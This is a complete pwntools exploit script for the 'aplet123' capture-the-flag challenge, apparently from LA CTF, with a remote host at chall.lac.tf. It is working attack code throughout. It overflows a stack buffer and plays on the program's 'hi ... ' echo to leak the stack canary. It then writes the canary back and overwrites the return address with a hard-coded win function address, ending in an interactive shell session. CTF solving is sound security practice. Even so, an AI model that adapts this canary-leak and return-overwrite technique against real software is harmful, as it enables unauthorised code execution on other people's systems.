from pwn import *

exe = ELF('./aplet123')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("chall.lac.tf", 31123)

rop = ROP(exe)
win = 0x00000000004011e6
offset = 0x50 - 0x8
payload = b'A' * (0x50 - 0x8)
payload = payload[:-3] + b"i'm"

io.sendlineafter(b'hello', payload)
io.recvuntil(b'hi ')
canary = io.recv(8)
print(f'{canary = }')
print(f'{len(canary) = }')

payload += b'\x00' + canary[:7]
payload += pack(win) * 10
io.sendline(payload)
io.sendline(b'bye')
io.interactive()
